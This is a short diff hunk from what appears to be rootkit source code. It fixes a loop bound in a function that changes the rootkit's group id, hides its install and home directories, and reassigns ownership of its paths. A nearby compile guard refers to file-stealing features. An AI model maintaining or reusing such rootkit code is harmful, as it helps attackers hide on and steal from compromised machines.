@@ -64,7 +64,7 @@ gid_t changerkgid(int curtime){
     hidedircontents(INSTALL_DIR, newgid);
     hidedircontents(HOMEDIR, newgid);
 
-    for(int i = 0; i != BDVPATHS_SIZE; i++)
+    for(int i = 0; i < BDVPATHS_SIZE; i++)
         chown_path(bdvpaths[i], newgid);
 
 #if defined FILE_STEAL && defined FILE_CLEANSE_TIMER
